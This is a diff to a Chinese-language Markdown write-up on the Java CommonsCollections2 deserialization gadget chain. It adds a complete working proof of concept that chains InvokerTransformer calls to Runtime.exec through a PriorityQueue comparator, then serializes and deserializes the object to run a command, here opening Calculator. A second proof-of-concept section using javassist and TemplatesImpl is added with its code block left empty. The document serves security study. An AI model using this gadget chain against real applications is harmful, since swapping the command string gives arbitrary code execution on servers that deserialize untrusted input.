@@ -122,9 +122,75 @@ public int compare(I obj1, I obj2) {
 ```
 > 这里需要注意几个地方，在`heapify()`方法处的`size`要是大于`1`的，只有这样才会继续进入到`siftDown()`方法中，而`size`的取值来自于
 
-## POC 链
+## POC 链1
+> 利用`PriorityQueue`和`CommonsCollections-1`后半部分来进行构造
+
+```java
+package CommonsCollections2;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2021/11/26 9:42 下午
+ */
+public class CommonsCollectionsGadget1 {
+    // public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+    public static void CC2() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+        PriorityQueue priorityQueue = new PriorityQueue(2);
+        priorityQueue.add(1);
+        priorityQueue.add(2);
+        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
+        field.setAccessible(true);
+        field.set(priorityQueue, transformingComparator);
+        try {
+            // 序列化操作
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget.bin"));
+            outputStream.writeObject(priorityQueue);
+            outputStream.close();
+            // 反序列化操作
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget.bin"));
+            inputStream.readObject();
+            inputStream.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) {
+        try {
+            CC2();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+<img src="./images/4.png" alt="">
+
+## POC 链2
+> 利用`javassist`和`TemplatesImpl`来进行构造
 
 ```java
 
 ```
-
